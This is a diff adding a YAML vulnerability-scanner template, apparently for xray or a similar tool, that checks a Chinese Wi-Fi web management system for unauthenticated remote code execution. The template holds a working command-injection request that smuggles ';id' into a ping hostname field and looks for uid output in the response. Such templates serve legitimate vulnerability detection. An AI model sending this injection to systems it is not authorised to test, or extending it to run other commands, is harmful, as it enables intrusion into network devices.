@@ -1,0 +1,15 @@
+name: 西迪特 Wi-Fi Web管理系统 未授权RCE漏洞
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1
+      headers:
+        X-Requested-With: XMLHttpRequest
+      body: |
+        call_function=ping&iface=eth0&hostname=127.0.0.1%3Bid
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/IIphedK_Npni5bJsQHfD0A
